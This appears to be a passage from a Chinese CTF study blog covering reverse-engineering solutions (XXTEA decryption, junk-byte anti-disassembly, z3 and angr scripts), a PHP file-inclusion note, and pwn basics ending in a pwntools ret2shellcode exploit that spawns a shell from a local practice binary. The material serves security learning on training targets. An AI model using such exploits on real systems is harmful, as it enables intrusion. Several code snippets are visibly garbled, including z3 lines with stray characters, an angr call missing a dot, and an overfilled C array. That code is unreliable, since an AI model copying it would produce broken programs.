class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z &gt;&gt; 5 ^ y <span class="meta-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3^z &lt;&lt;4) ^ (sum ^ y) + (k[p &amp; 3 ^ e] ^ z))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span>* v, <span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123; <span class="comment">/* coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">                y = v[p + <span class="number">1</span>],z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; <span class="comment">//Decoding Part</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">                z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">6</span>] = &#123;</span><br><span class="line">                <span class="number">0xC9494AB9</span>,</span><br><span class="line">        <span class="number">0xD57A3CE1</span>,</span><br><span class="line">        <span class="number">0xAF8EBF15</span>,</span><br><span class="line">        <span class="number">0xAF53A5E9</span>,</span><br><span class="line">        <span class="number">0xEC575E2B</span>,</span><br><span class="line">        <span class="number">0xD4ABB47D</span></span><br><span class="line">        <span class="number">-917943623</span>,</span><br><span class="line">        <span class="number">-713409311</span>,</span><br><span class="line">        <span class="number">-1349599467</span>,</span><br><span class="line">        <span class="number">-1353472535</span>,</span><br><span class="line">        <span class="number">-329818581</span>,</span><br><span class="line">        <span class="number">-726944643</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>] = &#123; <span class="number">2018915346</span>, <span class="number">266255514</span>, <span class="number">2562383102</span>, <span class="number">271733878</span> &#125;;</span><br><span class="line">    <span class="built_in">xxtea</span>(v, <span class="number">6</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给定的密钥（十六进制转字节）</span></span><br><span class="line">key_hex = <span class="string">&#x27;785634120FDEBC9A98BADCFE10325476&#x27;</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节流转换为四个32位整数（大端序）</span></span><br><span class="line">key_ints = [<span class="built_in">int</span>.from_bytes(key_bytes[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key_bytes), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在，key_ints 是一个包含四个32位整数的列表，可以作为XXTEA算法的密钥</span></span><br><span class="line"><span class="comment"># [2018915346, 266255514, 2562383102, 271733878]</span></span><br></pre></td></tr></table></figure>

<h2 id="脏字"><a href="#脏字" class="headerlink" title="脏字"></a>脏字</h2><p>U+C(XREF)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">addr :</span><br><span class="line">	push ebp</span><br><span class="line">	jz addr2</span><br><span class="line">	jnz addr2</span><br><span class="line">	db 0xE8 #会把0xE8当成call一个地址</span><br><span class="line">addr3 :</span><br><span class="line">    sub esp,0x100</span><br><span class="line">    add eax,0x1</span><br><span class="line">    sub ebx,0xAFBC11</span><br><span class="line">addr2:</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	jmp addr3</span><br></pre></td></tr></table></figure>

<h2 id="sp-analysis-failed（没办法f5）"><a href="#sp-analysis-failed（没办法f5）" class="headerlink" title="sp analysis failed（没办法f5）"></a>sp analysis failed（没办法f5）</h2><p>IDA分析时,需要确认”代码块”和”数据块”并把”有价值”的”代码块”分析为函数但是这种分析过程需要对esp寄存器充分追踪-旦追踪失败便会报错sp analysis failed 或者esp analysis failed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">addr1:</span><br><span class="line">    push ebp</span><br><span class="line">    push addr2</span><br><span class="line">    ret</span><br><span class="line">    jz addr2</span><br><span class="line">    jnz addr2</span><br><span class="line">    db OxE8</span><br><span class="line">addr3:</span><br><span class="line">    sub esp,0x100;0x81</span><br><span class="line">    add eax,0x1</span><br><span class="line">    sub ebx,0xAFBC11</span><br><span class="line">    mov esp,ebp</span><br><span class="line">    ret</span><br><span class="line">    ;当作JMP使用</span><br><span class="line">addr2:</span><br><span class="line">    mov ebp,esp</span><br><span class="line">    push addr3</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<h2 id="非自然程序流程"><a href="#非自然程序流程" class="headerlink" title="非自然程序流程"></a>非自然程序流程</h2><ul>
<li>扁平化的程序控制流</li>
<li>OLLVM程序流程控制转交</li>
</ul>
<p>主要是使用XREF来对程序流程进行跟踪和控制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x, y=Bitvecs( <span class="string">&#x27;x y &#x27;</span>,<span class="number">32</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(y / <span class="number">2</span>-x == -<span class="number">107702</span>)</span><br><span class="line">s.add(y &amp; <span class="number">1</span> == <span class="number">0</span>)</span><br><span class="line">s.add(y A <span class="number">333509</span> == x)</span><br><span class="line">s.add(<span class="number">881778</span>个<span class="number">666</span>&gt;=y)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="string">&#x27; SAT&#x27;</span><span class="comment">#有解的话</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><h3 id="00angr"><a href="#00angr" class="headerlink" title="00angr"></a>00angr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: p=angr.Project(<span class="string">&quot;./00_angr_find&quot;</span>)</span><br><span class="line">In [<span class="number">3</span>]: init_state=p.factory.entry_state()</span><br><span class="line">In [<span class="number">4</span>]: sm=p.factory.simulation_manager(init_state)</span><br><span class="line">In [<span class="number">5</span>]: sm.explore(find=<span class="number">0x08048678</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">24</span>,<span class="number">782</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="number">0x7ffeff60</span> <span class="keyword">with</span> <span class="number">4</span> unconstrained <span class="built_in">bytes</span> referenced <span class="keyword">from</span> <span class="number">0x8100000</span> (strcmp+<span class="number">0x0</span> <span class="keyword">in</span> extern-address space (<span class="number">0x0</span>))</span><br><span class="line">Out[<span class="number">5</span>]: &lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> active, <span class="number">16</span> deadended, <span class="number">1</span> found&gt;</span><br><span class="line">In [<span class="number">6</span>]: sm.found</span><br><span class="line">Out[<span class="number">6</span>]: [&lt;SimState @ <span class="number">0x8048678</span>&gt;]</span><br><span class="line">In [<span class="number">7</span>]: found_state=sm.found[<span class="number">0</span>]</span><br><span class="line">In [<span class="number">8</span>]: found_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">b&#x27;JXWVXRKX&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="01angr"><a href="#01angr" class="headerlink" title="01angr"></a>01angr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">6</span>]: p=angr.Project(<span class="string">&quot;./01_angr_avoid&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: init_state=p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: sm=p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: sm.explore(find=<span class="number">0x080485E5</span>,avoid=<span class="number">0x080485A8</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: found_state=sm.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: found_state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">b&#x27;Enter the password: &#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: found_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">13</span>]: <span class="string">b&#x27;HUJOZMYS&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: avoid_state=sm.avoid</span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: <span class="built_in">print</span>(avoid_state)</span><br><span class="line">[&lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;, &lt;SimState @ <span class="number">0x80485a8</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: <span class="built_in">print</span>(found_state)</span><br><span class="line">&lt;SimState @ <span class="number">0x80485e5</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: avoid_state[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">18</span>]: <span class="string">b&#x27;ADAPBAPC&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="02angr"><a href="#02angr" class="headerlink" title="02angr"></a>02angr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    p = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    init_state = p.factory.entry_state()</span><br><span class="line">    sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Solution: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(found_state.posix.dumps(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="03angr"><a href="#03angr" class="headerlink" title="03angr"></a>03angr</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path=argv[<span class="number">1</span>]</span><br><span class="line">    p=angr.Project(bin_path)</span><br><span class="line">    </span><br><span class="line">    start_addr=<span class="number">0x8048980</span></span><br><span class="line">    init_state=p.factory.blank_state(addr=start_addr)</span><br><span class="line">    </span><br><span class="line">    pass1=claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    pass2=claripy.BVS(<span class="string">&#x27;pass2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    pass3=claripy.BVS(<span class="string">&#x27;pass3&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    init_state.regs.eax=pass1</span><br><span class="line">    init_state.regs.ebx=pass2</span><br><span class="line">    init_state.regs.edx=pass3</span><br><span class="line">    </span><br><span class="line">    sm=p.factory.simulation_manager(init_state)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        found_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        password1=found_state.solver.<span class="built_in">eval</span>(pass1)</span><br><span class="line">        password2=found_statesolver.<span class="built_in">eval</span>(pass2)</span><br><span class="line">        password3=found_statesolver.<span class="built_in">eval</span>(pass3)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Solution: &#123;:x&#125; &#123;:x&#125; &#123;:X&#125;&#x27;</span>.<span class="built_in">format</span>(password1,password2,password3))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;No solution found&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>









<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ACTF2020-新生赛-Include1（文件包含）"><a href="#ACTF2020-新生赛-Include1（文件包含）" class="headerlink" title="[ACTF2020 新生赛]Include1（文件包含）"></a>[ACTF2020 新生赛]Include1（文件包含）</h2><p>这道题没有思路，直接搜的，学到了一个新东西，php伪协议</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44879989/article/details/133635742">PHP 伪协议：使用 php://input 访问原始 POST 数据-CSDN博客</a></p>
<p>在 PHP 中，伪协议（Pseudo Protocols） 也被称为 流包装器，这些伪协议以 php:// 开头，后面跟着一些参数，用于指定 要执行的操作 或 需要访问的资源。<br>伪协议表明这些协议并不是一个 真实的外部协议，例如 http 或 ftp。PHP 伪协议的出现是为了提供一个 统一的、简洁的 接口来处理 不同的数据流。这些伪协议可以被看作是一种 桥梁，它们允许开发者 使用常规的文件操作函数来处理各种不同的数据流。</p>
<h1 id="pwn学习"><a href="#pwn学习" class="headerlink" title="pwn学习"></a>pwn学习</h1><h2 id="Cyclic-Pattern"><a href="#Cyclic-Pattern" class="headerlink" title="Cyclic Pattern"></a>Cyclic Pattern</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyclic(0x100)<span class="comment">#生成一个0x100大小的pattern，即一个特殊的字符串</span></span><br><span class="line">cyclic_find(0x61616161)<span class="comment">#找到该数据在pattern中的位置(或者是cyclic -l 0x61616161)</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#查找位置也可以使用字符串去定付</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240616010950321.png" alt="image-20240616010950321"></p>
<h2 id="ELF操作"><a href="#ELF操作" class="headerlink" title="ELF操作"></a>ELF操作</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> hex(e.address) <span class="comment">#文件装载的基地址</span></span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> hex(e.symbols[<span class="string">&#x27;write&#x27;</span>])<span class="comment"># 函数地址,symbols,got,plt均是列表</span></span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> hex(e.got[<span class="string">&#x27;write&#x27;</span>])<span class="comment"># GOT表的地址</span></span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> hex(e.plt[<span class="string">&#x27;write&#x27;</span>])<span class="comment"># PLT的地址</span></span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> hex(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next())<span class="comment">#字符串/bin/sh的地址字符串加()</span></span><br></pre></td></tr></table></figure>

<h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510214030837.png" alt="image-20230510214030837"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230528011658739.png" alt="image-20230528011658739"></p>
<h2 id="return-to-text"><a href="#return-to-text" class="headerlink" title="return to text"></a>return to text</h2><p>最简单的栈溢出利用</p>
<p><strong>利用前提：</strong></p>
<p>开启了NX，栈上无法写入shellcode<br>shellcode包含system(“/bin/sh”)等<br>当NX保护开启，就表示题目给了你system(‘/bin/sh’)，如果关闭，表示你需要自己去构造shellcode</p>
<p><strong>利用思路：</strong></p>
<p>只要存在后门函数且有调用，就可以劫持EIP然后return to text</p>
<h2 id="手动测量变量溢出长度"><a href="#手动测量变量溢出长度" class="headerlink" title="手动测量变量溢出长度"></a>手动测量变量溢出长度</h2><p>还是ctfwiki的ret2text的题<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/yevixw">PWN入门（1-3-3）-手动测量变量溢出长度 (yuque.com)</a></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240617223551064.png" alt="image-20240617223551064"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240617223726047.png" alt="image-20240617223726047"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240617225244556-17186359649161.png" alt="image-20240617225244556"></p>
<p>从这里就可以看出程序溢出点为：0x62616164</p>
<p>看他报错的意思是(跳转到0x62616164)这步出错了，意思就是没有0x62616164这个位置，那这个位置是从哪来的呢，就是我们200个有序字符其中最先溢出的部分。那么只要知道这个0x62616164是我们输入的第几个，就可以数出来它前头有几个数字了。根据ASCI码表，又根据“0x’是16进制的意思，可以查表得出这串数字转换成字母是’baad’。接下来就要知道cyclic的顺序了，稍微观察一下就可以知道cyclic的规则(4个数4个数有规则)，轻易的就可以数出它的位置。当然还有更简单的方法，前文也说了cyclic是有序字符串，自然有一个子函数可以査，“cycic -l”代表着查询你所给的4bit字符前有几个字母。输入【cycic -l 0x62616164】，得到112，说明“baad’前有112个字母，那么这112个字母就是填充空栈的所需量了。接下来多的就会溢出。如下图所示:</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240617225632953.png" alt="image-20240617225632953"></p>
<h2 id="return-to-shellcode"><a href="#return-to-shellcode" class="headerlink" title="return to shellcode"></a>return to shellcode</h2><p>就是自己来填充shellcode然后劫持EIP来执行，同样是ctfwiki的题<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/glzdgr">PWN入门（1-3-4）-基本ROP-ret2shellcode (yuque.com)</a></p>
<p><strong>利用关键：</strong></p>
<p>1、程序存在溢出，并且还要能够控制返回地址</p>
<p>2、程序运行时，<font color="red">shellcode 所在的区域要拥有执行权限</font>(NX保护关闭、bss段可执行)</p>
<p>3、操作系统还需要关闭 ASLR(地址空间布局随机化)保护。(或关闭PIE保护)</p>
<p>解题步骤<br>先使用cyclic测试出溢出点，构造初步的payload</p>
<p>确定程序中的溢出位，看是否可在bss段传入数据</p>
<p>使用GDB的vmmap查看bss段(一般为用户提交的变量在bss段中)</p>
<p>先发送为shellcode的数据写入到bss段</p>
<p>在将程序溢出到上一步用户提交变量的地址</p>
<p>在ida中查看buf2的情况</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240617235711643.png" alt="image-20240617235711643"></p>
<p>在pwndbg里下好main函数的断点后运行，用vmmap查看buf2对应的bss段是否可以运行</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240618000721471.png" alt="image-20240618000721471"></p>
<p>这里显示是可以运行的，这里先计算一下溢出空间</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240618001238478.png" alt="image-20240618001238478"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240618001411412.png" alt="image-20240618001411412"></p>
<p>溢出空间还是112</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./retshellcode&#x27;</span>)</span><br><span class="line">buf2_addr=<span class="number">0x804A080</span></span><br><span class="line">shellcode=asm(shellcraft.sh()) <span class="comment"># shellcraft.sh()的内容其实就是执行了一次system(&#x27;/bin/sh&#x27;)或evecve(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload=shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(buf2_addr) <span class="comment">#ljust是使用自定义字符讲shellcode补齐为112个字符</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

